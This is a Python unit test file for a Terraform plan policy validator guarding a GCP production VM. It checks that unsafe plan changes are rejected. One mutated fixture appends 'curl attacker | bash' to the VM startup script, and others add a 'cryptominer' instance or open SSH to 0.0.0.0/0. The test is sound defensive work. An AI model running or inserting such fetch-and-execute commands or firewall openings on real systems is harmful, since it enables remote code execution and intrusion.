from __future__ import annotations

import copy
import hashlib
import importlib.util
from pathlib import Path
import unittest


SCRIPT = Path(__file__).parents[1] / "scripts" / "verify-terraform-plan.py"
SPEC = importlib.util.spec_from_file_location("verify_terraform_plan", SCRIPT)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)


STATIC_NAME = "he-testbed-feedback-ip"
STATIC_IP = "35.216.80.123"
PROJECT_ID = "project-72a52bf1-06aa-4519-b2c"
RUNTIME_EMAIL = f"gole-production-runtime@{PROJECT_ID}.iam.gserviceaccount.com"
STARTUP_SCRIPT = "#!/usr/bin/env bash\nset -euo pipefail\n# independently reviewed fixture\n"
STARTUP_SHA256 = hashlib.sha256(STARTUP_SCRIPT.encode()).hexdigest()


def resource(address: str, before: dict, after: dict, actions: list[str]) -> dict:
    return {
        "address": address,
        "type": address.split(".", 1)[0],
        "change": {"actions": actions, "before": before, "after": after},
    }


def instance_state(ip: str) -> dict:
    return {
        "name": "gole-production",
        "zone": "asia-northeast3-a",
        "network_interface": [
            {
                "network": "default",
                "alias_ip_range": [],
                "ipv6_access_config": [],
                "access_config": [{"nat_ip": ip, "network_tier": "STANDARD"}],
            }
        ],
        "deletion_protection": True,
        "machine_type": "e2-standard-2",
        "tags": ["gole-web", "gole-ssh-iap"],
        "labels": {"app": "gole", "environment": "production", "managed-by": "terraform"},
        "metadata": {"enable-oslogin": "TRUE", "startup-script": STARTUP_SCRIPT},
        "boot_disk": [{"auto_delete": False, "initialize_params": [{
            "image": "projects/ubuntu-os-cloud/global/images/ubuntu-2404-noble-amd64-v20260826",
            "size": 100,
            "type": "pd-balanced",
        }]}],
        "service_account": [{"email": RUNTIME_EMAIL, "scopes": ["cloud-platform"]}],
        "shielded_instance_config": [{
            "enable_secure_boot": True,
            "enable_vtpm": True,
            "enable_integrity_monitoring": True,
        }],
        "scheduling": [{"automatic_restart": True, "on_host_maintenance": "MIGRATE"}],
        "resource_policies": [],
    }


def snapshot_state() -> dict:
    return {
        "name": "gole-production-daily-snapshots",
        "snapshot_schedule_policy": [
            {
                "schedule": [
                    {"daily_schedule": [{"days_in_cycle": 1, "start_time": "20:00"}]}
                ],
                "retention_policy": [
                    {
                        "max_retention_days": 3,
                        "on_source_disk_delete": "APPLY_RETENTION_POLICY",
                    }
                ],
                "snapshot_properties": [
                    {
                        "guest_flush": False,
                        "storage_locations": ["asia-northeast3"],
                        "labels": {
                            "app": "gole",
                            "environment": "production",
                            "backup": "daily",
                            "managed-by": "terraform",
                        },
                    }
                ],
            }
        ],
    }


def safe_plan() -> dict:
    address = {"name": STATIC_NAME, "address": STATIC_IP, "network_tier": "STANDARD"}
    instance = instance_state(STATIC_IP)
    instance_before = copy.deepcopy(instance)
    instance_before["boot_disk"][0]["auto_delete"] = True
    changes = [
            resource("google_compute_address.gole", address, copy.deepcopy(address), ["no-op"]),
            resource("google_compute_instance.gole", instance_before, copy.deepcopy(instance), ["update"]),
            resource(
                "google_compute_resource_policy.daily_boot_disk_snapshots",
                None,
                snapshot_state(),
                ["create"],
            ),
            resource(
                "google_compute_disk_resource_policy_attachment.daily_boot_disk_snapshots",
                None,
                {
                    "name": "gole-production-daily-snapshots",
                    "disk": "gole-production",
                    "zone": "asia-northeast3-a",
                },
                ["create"],
            ),
        ]
    existing_stubs = MODULE.REQUIRED_EXISTING_RESOURCES - {
        "google_compute_address.gole",
        "google_compute_instance.gole",
    }
    for item in sorted(existing_stubs):
        after: dict = {}
        project_services = {
            "google_project_service.compute": "compute.googleapis.com",
            "google_project_service.pubsub": "pubsub.googleapis.com",
            "google_project_service.billing_budgets": "billingbudgets.googleapis.com",
            "google_project_service.public_ca": "publicca.googleapis.com",
            "google_project_service.iam": "iam.googleapis.com",
            "google_project_service.secret_manager": "secretmanager.googleapis.com",
        }
        if item in project_services:
            after = {"service": project_services[item], "disable_on_destroy": False}
        elif item == "google_service_account.production_runtime":
            after = {"account_id": "gole-production-runtime", "email": RUNTIME_EMAIL}
        elif item == "google_secret_manager_secret.production_env":
            after = {"secret_id": "gole-production-env"}
        elif item == "google_project_iam_custom_role.budget_subscription_consumer":
            after = {"role_id": "goleBudgetSubscriptionConsumer", "permissions": ["pubsub.subscriptions.consume"], "stage": "GA"}
        elif item == "google_secret_manager_secret_iam_member.production_env_accessor":
            after = {"role": "roles/secretmanager.secretAccessor", "member": f"serviceAccount:{RUNTIME_EMAIL}"}
        elif item == "google_pubsub_topic_iam_member.billing_budget_publisher":
            after = {"role": "roles/pubsub.publisher", "member": "serviceAccount:billing-budget-alert@system.gserviceaccount.com"}
        elif item == "google_pubsub_subscription_iam_member.budget_relay_subscriber":
            after = {"role": f"projects/{PROJECT_ID}/roles/goleBudgetSubscriptionConsumer", "member": f"serviceAccount:{RUNTIME_EMAIL}"}
        elif item == "google_compute_firewall.web":
            after = firewall("gole-web", 1000, ["0.0.0.0/0"], ["gole-web"], allow=[{"ports": ["80", "443"], "protocol": "tcp"}])
        elif item == "google_compute_firewall.ssh_iap":
            after = firewall("gole-ssh-iap", 800, ["35.235.240.0/20"], ["gole-ssh-iap"], allow=[{"ports": ["22"], "protocol": "tcp"}])
        elif item == "google_compute_firewall.deny_public_admin":
            after = firewall("gole-deny-public-admin", 900, ["0.0.0.0/0"], ["gole-ssh-iap"], deny=[{"ports": ["22", "3389"], "protocol": "tcp"}])
        elif item == "google_pubsub_topic.billing_budget":
            after = {"name": "gole-billing-budget"}
        elif item == "google_pubsub_subscription.billing_budget_discord":
            after = {
                "name": "gole-billing-budget-discord",
                "topic": "gole-billing-budget",
                "ack_deadline_seconds": 60,
                "message_retention_duration": "604800s",
            }
        changes.append(resource(item, copy.deepcopy(after), after, ["no-op"]))
    for item, role in (
        ("google_project_iam_member.operator_os_admin", "roles/compute.osAdminLogin"),
        ("google_project_iam_member.operator_iap_tunnel", "roles/iap.tunnelResourceAccessor"),
        ("google_service_account_iam_member.operator_service_account_user", "roles/iam.serviceAccountUser"),
    ):
        changes.append(resource(item, None, {"role": role, "member": "user:coldingcontact@gmail.com"}, ["create"]))
    return {"resource_changes": changes}


def firewall(name: str, priority: int, sources: list[str], tags: list[str], *, allow=None, deny=None) -> dict:
    return {
        "name": name,
        "network": "default",
        "direction": "INGRESS",
        "priority": priority,
        "source_ranges": sources,
        "target_tags": tags,
        "source_tags": [],
        "source_service_accounts": [],
        "target_service_accounts": [],
        "allow": allow or [],
        "deny": deny or [],
    }


class ExistingPlanPolicyTest(unittest.TestCase):
    def validate(self, plan: dict) -> None:
        MODULE.validate_existing_plan(
            plan,
            expected_static_ip_name=STATIC_NAME,
            expected_static_ip=STATIC_IP,
            expected_project_id=PROJECT_ID,
            expected_startup_script_sha256=STARTUP_SHA256,
        )

    def test_allows_in_place_vm_update_and_new_snapshot_policy(self) -> None:
        self.validate(safe_plan())

    def test_allows_already_managed_adoption_resources_as_no_ops(self) -> None:
        plan = safe_plan()
        for change in plan["resource_changes"]:
            if change["address"] in MODULE.REQUIRED_ADOPTION_RESOURCES:
                change["change"]["before"] = copy.deepcopy(change["change"]["after"])
                change["change"]["actions"] = ["no-op"]
        self.validate(plan)

    def test_rejects_unimported_address_create(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"] = {
            "actions": ["create"],
            "before": None,
            "after": {"name": STATIC_NAME, "address": None},
        }
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_address_rename_replacement(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"]["actions"] = ["delete", "create"]
        plan["resource_changes"][0]["change"]["after"]["name"] = "gole-production-ip"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_instance_nat_ip_change(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"] = instance_state("35.216.80.124")
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_address_or_instance_network_tier_change(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"]["after"]["network_tier"] = "PREMIUM"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"]["network_interface"][0][
            "access_config"
        ][0]["network_tier"] = "PREMIUM"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_missing_deletion_protection_or_os_login(self) -> None:
        for key, value in (("deletion_protection", False), ("metadata", {})):
            with self.subTest(key=key):
                plan = safe_plan()
                plan["resource_changes"][1]["change"]["after"][key] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_wrong_machine_shape_or_instance_schedule(self) -> None:
        for key, value in (
            ("machine_type", "e2-custom-4-8192"),
            ("resource_policies", ["he-testbed-office-hours"]),
        ):
            with self.subTest(key=key):
                plan = safe_plan()
                plan["resource_changes"][1]["change"]["after"][key] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_missing_or_relaxed_snapshot_policy(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][2]["change"]["after"][
            "snapshot_schedule_policy"
        ][0]["retention_policy"][0]["max_retention_days"] = 30
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_any_unrelated_destroy(self) -> None:
        plan = safe_plan()
        plan["resource_changes"].append(
            resource("google_compute_firewall.web", {"name": "gole-web"}, None, ["delete"])
        )
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_unreviewed_create_update_and_startup_script(self) -> None:
        mutations = []
        extra_vm = safe_plan()
        extra_vm["resource_changes"].append(
            resource("google_compute_instance.cryptominer", None, {"machine_type": "a3-highgpu-8g"}, ["create"])
        )
        mutations.append(extra_vm)

        firewall_open = safe_plan()
        next(item for item in firewall_open["resource_changes"] if item["address"] == "google_compute_firewall.ssh_iap")["change"]["after"]["source_ranges"] = ["0.0.0.0/0"]
        mutations.append(firewall_open)

        startup = safe_plan()
        startup["resource_changes"][1]["change"]["after"]["metadata"]["startup-script"] += "curl attacker | bash\n"
        mutations.append(startup)

        disk = safe_plan()
        disk["resource_changes"][1]["change"]["after"]["boot_disk"][0]["initialize_params"][0]["size"] = 10000
        mutations.append(disk)

        scope = safe_plan()
        scope["resource_changes"][1]["change"]["after"]["service_account"][0]["scopes"] = ["cloud-platform", "userinfo-email"]
        mutations.append(scope)

        for plan in mutations:
            with self.subTest():
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_secret_version_payload_resource(self) -> None:
        plan = safe_plan()
        plan["resource_changes"].append(
            {
                "address": "google_secret_manager_secret_version.production_env",
                "type": "google_secret_manager_secret_version",
                "change": {"actions": ["create"], "before": None, "after": {}},
            }
        )
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_update_to_any_imported_non_vm_resource(self) -> None:
        for address in (
            "google_service_account.production_runtime",
            "google_secret_manager_secret.production_env",
            "google_pubsub_subscription.billing_budget_discord",
            "google_compute_firewall.web",
        ):
            with self.subTest(address=address):
                plan = safe_plan()
                item = next(
                    value
                    for value in plan["resource_changes"]
                    if value["address"] == address
                )
                item["change"]["actions"] = ["update"]
                with self.assertRaisesRegex(
                    MODULE.PlanPolicyError, "separate reviewed migration"
                ):
                    self.validate(plan)

    def test_rejects_unknown_provider_field_and_action_vector(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"]["future_root_capability"] = True
        with self.assertRaisesRegex(MODULE.PlanPolicyError, "unreviewed provider field"):
            self.validate(plan)

        plan = safe_plan()
        plan["resource_changes"][1]["change"]["actions"] = ["read"]
        with self.assertRaisesRegex(MODULE.PlanPolicyError, "unreviewed action vector"):
            self.validate(plan)


if __name__ == "__main__":
    unittest.main()
